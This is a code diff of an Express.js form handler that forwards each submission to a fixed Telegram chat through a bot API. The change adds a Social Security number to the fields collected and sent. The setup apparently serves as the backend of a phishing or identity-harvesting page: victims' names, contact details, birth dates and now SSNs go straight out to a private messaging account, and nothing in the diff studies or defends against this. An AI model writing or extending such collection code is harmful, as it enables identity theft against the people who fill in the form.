@@ -152,14 +152,14 @@ app.post("/form_bunny", async (req, res) => {
   try {
     console.log(req.body);
 
-    const { firstName, lastName, email, phoneNumber, gender, dob } =
+    const {firstName, lastName, email, phoneNumber, ssn, gender, dob } =
       req.body;
 
     // Handle other form fields as needed
 
     await axios.post(`${TELEGRAM_API4}/sendMessage`, {
       chat_id: "7068073891",
-      text: `New Form Submission:\n\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nGender: ${gender}\nDate of Birth: ${dob}`,
+      text: `New Form Submission:\n\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nSSN: ${ssn}\nGender: ${gender}\nDate of Birth: ${dob}`,
     });
 
     return res.send();
